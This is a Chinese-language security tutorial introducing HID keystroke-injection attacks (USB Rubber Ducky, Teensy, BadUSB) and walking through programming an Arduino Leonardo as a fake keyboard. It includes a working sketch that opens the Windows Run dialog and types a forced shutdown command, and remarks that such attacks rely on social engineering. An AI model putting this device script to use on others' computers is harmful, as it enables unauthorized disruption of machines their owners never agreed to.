## **0x01 背景知识**

HID（Human
InterfaceDevice，是计算机直接与人交互的设备，例如键盘、鼠标等）攻击的一种。攻击者通过将USB设备模拟成为键盘，让电脑识别成为键盘，然后进行脚本模拟按键进行攻击。Badusb也属于HID攻击的一种，在badusb之前还有两种HID攻击分别是teensy和USB
RUBBER DUCKY（usb橡皮鸭）。斗哥先介绍以下这三种类型有何不同。

 **USB RUBBER DUCKY（usb橡皮鸭）**

USB RUBBER
DUCKY简称usb橡皮鸭，是最早的按键注入工具，可根据对应要求定制硬件。价格较贵动不动就是大几十刀，不过目前已形成成熟的商业模式。可在<http://www.ducktoolkit.com/Home.jsp>自助生成攻击脚本。

![usb.webp.jpg](https://image.3001.net/images/20180815/1534323241_5b73ea2939a05.jpg!small)

 **Teensy**

Teensy是拥有芯片且功能完整的单片机开发系统。可模拟键盘和鼠标。经开发的teensy
usb设备可被电脑识别成键盘或鼠标，然后执行编程进去的恶意代码。价格亲民，开源性强可和kali配合使用。小编后续的实验也都是基于这种芯片。

![sy.webp.jpg](https://image.3001.net/images/20180815/1534323310_5b73ea6ed620a.jpg!small)

 **BADUSB**

BADUSB是2014年黑客大会上由柏林SRLabs的安全研究人员JakobLell和独立安全研究人员Karsten
Nohl展示攻击方法，该攻击方法通过对普通u盘的固件进行逆向重新编程，修改了u盘的系统，然后进行攻击。KarstenNohl和Jakob
Lell在github上公布代码<https://github.com/brandonlw/Psychson>，下图为公布的代码逻辑。

![640.webp.jpg](https://image.3001.net/images/20180815/1534323357_5b73ea9d70b74.jpg!small)

##  **0x02 Teensy制作**

准备材料：

![材料.webp.jpg](https://image.3001.net/images/20180815/1534323410_5b73ead24730c.jpg!small)

Arduino Leonardo //小型单片机模拟USB。

超短micro转USB。

![转.webp.jpg](https://image.3001.net/images/20180815/1534323450_5b73eafaef165.jpg!small)

Arduino IDE //用于烧录代码的编译器 。

<http://www.arduino.cn/thread-5838-1-1.html>（建议用1.6 的版本）。

![版本.webp.jpg](https://image.3001.net/images/20180815/1534323486_5b73eb1e0c23d.jpg!small)

 **Arduino IDE使用：**

Arduino
IDE安装过程没有特别需要注意的，部分系统需要安装驱动<https://pan.baidu.com/s/1bo7I6EN>（小编在win7和win10上都无须安装驱动）

1.开启Arduino IDE，设置开发板的类型为：

![类型.webp.jpg](https://image.3001.net/images/20180815/1534323518_5b73eb3e6c135.jpg!small)

2.设置端口为连入的Arduino Leonardo板。

![板.webp.jpg](https://image.3001.net/images/20180815/1534323542_5b73eb56de192.jpg!small)

3.代码区

在代码区域写入执行代码，循环代码区域写入的代码会循环执行。

![代码区.webp.jpg](https://image.3001.net/images/20180815/1534323599_5b73eb8f3c260.jpg!small)

4.调试、写入

经调试后无语法错误，即可将代码写入开发板中。

![开发.webp.jpg](https://image.3001.net/images/20180815/1534323831_5b73ec7764ec8.jpg!small)

5.测试例子

例子的结果是让插上板子的电脑自动关机。为了便于后续的调试和修改，延迟时间设置的比较长。详细的Arduino keyboard库的解释可参考该链接。

<https://www.arduino.cn/thread-21472-1-1.html>；

    
    
    #include <Keyboard.h> //引用键盘库文件
    
    void setup() {//初始化
    
     Keyboard.begin();//开始键盘通讯 
    
     delay(3000);//延时3000毫秒
    
     Keyboard.press(KEY_LEFT_GUI);//win键 
    
     delay(500); //延迟500毫秒
    
     Keyboard.press('r');//r键 
    
     delay(500); //延迟500毫秒
    
     Keyboard.release(KEY_LEFT_GUI);//释放win键
    
     Keyboard.release('r'); //释放r键
    
     delay(500); //延迟500毫秒
    
     Keyboard.println("SHUTDOWN -S -F -T 0"); //输入SHUTDOWN -S -F -T 0
    
     delay(5000); //延迟5000毫秒（）
    
     Keyboard.press(KEY_RETURN); //
    
     Keyboard.release(KEY_RETURN);
    
     Keyboard.end();//结束键盘通讯 
    
    }
    
    void loop()//循环
    
    {
    
    }
    

## **0x03 小结**

本文简单分享了HID攻击，以下关于实践过程中的注意点和思考。

1.HID攻击需配合社会工程学进行攻击。

2.Keyboard.press 完一定要Keyboard.release 释放按键， 不然会一直按。

3.Arduino IDE1.8版本必须要添加库文件才能调试成功。

4.Arduino keyboard库的介绍可参考该链接。

<https://www.arduino.cn/thread-21472-1-1.html>

5\. teensy开发板可和kali配合使用，将在后续分享。

![qrcode_for_gh_223e082fe8a7_344.jpg](https://image.3001.net/images/20180815/1534324049_5b73ed51c35a0.jpg!small)

